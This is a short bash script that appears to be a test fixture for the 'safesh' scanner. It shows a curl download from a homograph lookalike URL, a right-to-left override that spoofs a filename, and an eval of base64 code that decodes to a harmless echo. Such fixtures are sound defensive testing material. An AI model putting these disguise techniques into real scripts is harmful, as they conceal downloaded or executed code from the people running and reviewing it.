#!/bin/bash
set -euo pipefail

echo "Bootstrapping..."

# Fetch helper from a homograph URL (downloads.example.com with a Cyrillic 'a'):
curl -fsSL https://downloаds.example.com/helper.sh -o /tmp/helper.sh

# Looks like  install.sh.txt  but the override flips it: tx‮hs.llatsni

# Obfuscated payload — safesh flags this as a blocking finding
eval "$(echo 'ZWNobyAiUnVubmluZyBoaWRkZW4gcGF5bG9hZC4uLiIK' | base64 -d)"

echo "Done."
